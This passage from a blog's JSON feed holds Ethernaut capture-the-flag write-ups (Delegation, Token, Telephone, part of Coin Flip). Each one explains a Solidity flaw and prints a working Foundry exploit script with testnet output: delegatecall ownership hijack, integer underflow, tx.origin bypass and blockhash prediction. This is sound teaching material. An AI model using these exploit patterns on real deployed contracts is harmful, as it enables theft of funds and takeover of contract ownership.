class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">this</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The <code class=\"language-plaintext highlighter-rouge\">fallback()</code> function in the Delegation contract performs <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code> to the Delegate contract.</p><p>The Delegation contract‚Äôs state can be changed by caliing the <code class=\"language-plaintext highlighter-rouge\">pwn()</code> function in Delegate contract via <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">msg.sender</code> in the Delegate contract will be EOA because the call is made by using <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Delegation.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">DelegationSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Delegation</span> <span class=\"k\">public</span> <span class=\"n\">delegation_</span> <span class=\"o\">=</span> <span class=\"n\">Delegation</span><span class=\"p\">(</span><span class=\"mh\">0x604BD638031054664E87618f46871c5423E9cbFF</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegation_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"pwn()\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">delegation_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/DelegationSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>280.67msCompiler run successful with warnings:Warning <span class=\"o\">(</span>9302<span class=\"o\">)</span>: Return value of low-level calls not used.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/DelegationSol.sol:14:9:   |14 |         address<span class=\"o\">(</span>delegation_<span class=\"o\">)</span>.call<span class=\"o\">(</span>abi.encodeWithSignature<span class=\"o\">(</span><span class=\"s2\">\"pwn()\"</span><span class=\"o\">))</span><span class=\"p\">;</span>   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001000019 gweiEstimated total gas used <span class=\"k\">for </span>script: 43100Estimated amount required: 0.0000000431008189 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fdBlock: 3677303Paid: 0.000000031204249632 ETH <span class=\"o\">(</span>31204 gas <span class=\"k\">*</span> 0.001000008 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Delegation/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/delegation",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","delegatecall"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/token",
            "title": "[Ethernaut] 05.Token",
            "summary": null,
            "content_text": "AnalysisThe goal is  hands on any additional tokens.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token {    mapping(address =&gt; uint256) balances;    uint256 public totalSupply;    constructor(uint256 _initialSupply) public {        balances[msg.sender] = totalSupply = _initialSupply;    }    function transfer(address _to, uint256 _value) public returns (bool) {        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    }    function balanceOf(address _owner) public view returns (uint256 balance) {        return balances[_owner];    }}Overflow can occur in Solidity versions under 0.8.0.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Token.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract TokenSol is Script {    Token public token_ = Token(0xc5176701831Dcf084be5f95617605D2107d97182);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"balance: \", token_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        token_.transfer(address(0), 21);        console.log(\"balance: \", token_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        vm.stopBroadcast();    }}$ forge script script/TokenSol.sol --broadcast[‚†ä] Compiling...[‚†í] Compiling 1 files with Solc 0.6.12[‚†ë] Solc 0.6.12 finished in 497.00msCompiler run successful!Script ran successfully.== Logs ==  balance:  20  balance:  115792089237316195423570985008687907853269984665640564039457584007913129639935## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001000007 gweiEstimated total gas used for script: 67542Estimated amount required: 0.000000067542472794 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x6b9a4361bf15dc0a907240c72dd64d9c5cfbffafd2bbfd0197ad7dd053aa115eBlock: 3677316Paid: 0.0000000489 ETH (48900 gas * 0.001 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.0000000489 ETH (48900 gas * avg 0.001 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>hands on any additional tokens.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Token</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">totalSupply</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_initialSupply</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">totalSupply</span> <span class=\"o\">=</span> <span class=\"n\">_initialSupply</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_value</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-</span> <span class=\"n\">_value</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">_value</span><span class=\"p\">;</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">_value</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"nb\">balance</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_owner</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Overflow can occur in Solidity versions under 0.8.0.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Token.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">TokenSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Token</span> <span class=\"k\">public</span> <span class=\"n\">token_</span> <span class=\"o\">=</span> <span class=\"n\">Token</span><span class=\"p\">(</span><span class=\"mh\">0xc5176701831Dcf084be5f95617605D2107d97182</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"balance: \"</span><span class=\"p\">,</span> <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">),</span> <span class=\"mi\">21</span><span class=\"p\">);</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"balance: \"</span><span class=\"p\">,</span> <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/TokenSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†í] Compiling 1 files with Solc 0.6.12<span class=\"o\">[</span>‚†ë] Solc 0.6.12 finished <span class=\"k\">in </span>497.00msCompiler run successful!Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  balance:  20  balance:  115792089237316195423570985008687907853269984665640564039457584007913129639935<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001000007 gweiEstimated total gas used <span class=\"k\">for </span>script: 67542Estimated amount required: 0.000000067542472794 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0x6b9a4361bf15dc0a907240c72dd64d9c5cfbffafd2bbfd0197ad7dd053aa115eBlock: 3677316Paid: 0.0000000489 ETH <span class=\"o\">(</span>48900 gas <span class=\"k\">*</span> 0.001 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.0000000489 ETH (48900 gas * avg 0.001 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Token/balanceofplayer.png\" alt=\"Image balanceofplayer\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Token/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/token",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","overflow"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/telephone",
            "title": "[Ethernaut] 04.Telephone",
            "summary": null,
            "content_text": "AnalysisThe goal is  Claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone {    address public owner;    constructor() {        owner = msg.sender;    }    function changeOwner(address _owner) public {        if (tx.origin != msg.sender) {            owner = _owner;        }    }}When initially creating a contract, the owner is set to msg.sender. However, in the changeOwner() function, if tx.origin and msg.sender are different, the value received as an argument is set as the owner.tx.origin is the address that first initiated the contract call (it‚Äôs always an EOA account),msg.sender is the address that last called the contract.If I call contract A, and contract A calls contract B, a difference will arise between tx.origin and msg.sender within contract B.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Telephone.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(Telephone telephone_, address _address) {        telephone_.changeOwner(_address);    }}contract TelephoneSol is Script {    Telephone public telephone_ = Telephone(0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"owner: \", telephone_.owner());        new Ex(telephone_, vm.envAddress(\"MY_ADDRESS\"));        console.log(\"owner: \", telephone_.owner());        vm.stopBroadcast();    }}$ forge script script/TelephoneSol.sol --broadcast --tc TelephoneSol[‚†ä] Compiling...[‚†∞] Compiling 1 files with Solc 0.8.29[‚†î] Solc 0.8.29 finished in 283.34msCompiler run successful!Script ran successfully.== Logs ==  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001913718 gweiEstimated total gas used for script: 107575Estimated amount required: 0.00000020586821385 ETH==========================‚†Å Sequence #1 on holesky | Waiting for pending transactions    ‚†† [Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d    ‚†≤ [00:00:08] [#####################################################################] 1/1 txes (0.0s)##### holesky‚úÖ  [Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274dContract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fCBlock: 3672184Paid: 0.000000158359337 ETH (82750 gas * 0.001913708 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>Claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Telephone</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">changeOwner</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">tx</span><span class=\"p\">.</span><span class=\"n\">origin</span> <span class=\"o\">!=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>When initially creating a contract, the <code class=\"language-plaintext highlighter-rouge\">owner</code> is set to <code class=\"language-plaintext highlighter-rouge\">msg.sender</code>. However, in the <code class=\"language-plaintext highlighter-rouge\">changeOwner()</code> function, if <code class=\"language-plaintext highlighter-rouge\">tx.origin</code> and <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> are different, <strong>the value received as an argument</strong> is set as the <code class=\"language-plaintext highlighter-rouge\">owner</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">tx.origin</code> is the address that first initiated the contract call (it‚Äôs always an EOA account),</p><p><code class=\"language-plaintext highlighter-rouge\">msg.sender</code> is the address that last called the contract.</p><p>If I call contract A, and contract A calls contract B, a difference will arise between <code class=\"language-plaintext highlighter-rouge\">tx.origin</code> and <code class=\"language-plaintext highlighter-rouge\">msg.sender</code> within contract B.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Telephone.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"n\">Telephone</span> <span class=\"n\">telephone_</span><span class=\"p\">,</span> <span class=\"kt\">address</span> <span class=\"n\">_address</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">changeOwner</span><span class=\"p\">(</span><span class=\"n\">_address</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">TelephoneSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Telephone</span> <span class=\"k\">public</span> <span class=\"n\">telephone_</span> <span class=\"o\">=</span> <span class=\"n\">Telephone</span><span class=\"p\">(</span><span class=\"mh\">0x2823D4881bbE52bBaCc385753eDf4Fb5f15167fe</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">(</span><span class=\"n\">telephone_</span><span class=\"p\">,</span> <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">telephone_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/TelephoneSol.sol <span class=\"nt\">--broadcast</span> <span class=\"nt\">--tc</span> TelephoneSol<span class=\"o\">[</span>‚†ä] Compiling...<span class=\"o\">[</span>‚†∞] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>‚†î] Solc 0.8.29 finished <span class=\"k\">in </span>283.34msCompiler run successful!Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  owner:  0x983B67F395c62AeE070B9c34033Bc8836E0713Eb  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001913718 gweiEstimated total gas used <span class=\"k\">for </span>script: 107575Estimated amount required: 0.00000020586821385 ETH<span class=\"o\">==========================</span>‚†Å Sequence <span class=\"c\">#1 on holesky | Waiting for pending transactions</span>    ‚†† <span class=\"o\">[</span>Pending] 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274d    ‚†≤ <span class=\"o\">[</span>00:00:08] <span class=\"o\">[</span><span class=\"c\">#####################################################################] 1/1 txes (0.0s)</span><span class=\"c\">##### holesky</span>‚úÖ  <span class=\"o\">[</span>Success] Hash: 0xeb3d1ed29a0f8fbf261705f6b3f6d721b8a1f3e312a5d41ed3d4194ae44f274dContract Address: 0x596F07f432EB60a01F9ff7007060F4982b7C01fCBlock: 3672184Paid: 0.000000158359337 ETH <span class=\"o\">(</span>82750 gas <span class=\"k\">*</span> 0.001913708 gwei<span class=\"o\">)</span>‚úÖ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000158359337 ETH (82750 gas * avg 0.001913708 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Telephone/complete.png\" alt=\"Image complete\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-18-Telephone/owner().png\" alt=\"Image owner\" /></p>",
            "url": "https://0o3q.github.io/2025/04/18/telephone",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","tx.origin"],
            
            "date_published": "2025-04-18T00:00:00+09:00",
            "date_modified": "2025-04-18T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/coin-flip",
            "title": "[Ethernaut] 03.Coin Flip",
            "summary": null,
            "content_text": "AnalysisThe goal is  guess the correct outcome 10 times in a row.// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip {    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() {        consecutiveWins = 0;    }    function flip(bool _guess) public returns (bool) {        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) {            revert();        }        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) {            consecutiveWins++;            return true;        } else {            consecutiveWins = 0;            return false;        }    }}Using to blackhash value to generate random numbers.Since this is accessible not only to the contract but also to external users, it becomes predictable.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/CoinFlip.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(CoinFlip coinflip_) {        uint256 blockValue = uint256(blockhash(block.number - 1));        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        coinflip_.flip(side);    }}contract CoinFlipSol is Script {    CoinFlip public coinflip_ = CoinFlip(0x97Cf73B713944bD171aEd799FEDdED4BC5Fd3765);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        new Ex(coinflip_);        console.log(\"Win counts: \", coinflip_.consecutiveWins());                vm.stopBroadcast();    }}Looking at the problem code,if (lastHash == blockValue) {    revert();}Since it reverts when lastHash and blockValue are the same, it‚Äôs impossible to execute repeatedly with a loop within the same contract.Therefore, I wrote it to be executed 10 times manually to solve the problem.$ forge script script/CoinFlipSol.sol --tc CoinFlipSol --broadcast[‚†ä] Compiling...No files changed, compilation skippedScript ran successfully.== Logs ==  Win counts:  10## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.002187102 gweiEstimated total gas used for script: 123189Estimated amount required: 0.000000269426908278 ETH==========================##### holesky‚úÖ  [Success] Hash: 0x0a5c9241d43f66408948fff9f14bad881a6f1717557f05d693967085b33fc4c9Contract Address: 0x0BBe439AF9BC57d2358965e1d78B2831290038F9Block: 3672028Paid: 0.000000207251214534 ETH (94761 gas * 0.002187094 gwei)‚úÖ Sequence #1 on holesky | Total Paid: 0.000000207251214534 ETH (94761 gas * avg 0.002187094 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>guess the correct outcome 10 times in a row.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">CoinFlip</span> <span class=\"p\">{</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">consecutiveWins</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">lastHash</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"n\">FACTOR</span> <span class=\"o\">=</span> <span class=\"mi\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">()</span> <span class=\"p\">{</span>        <span class=\"n\">consecutiveWins</span> <span 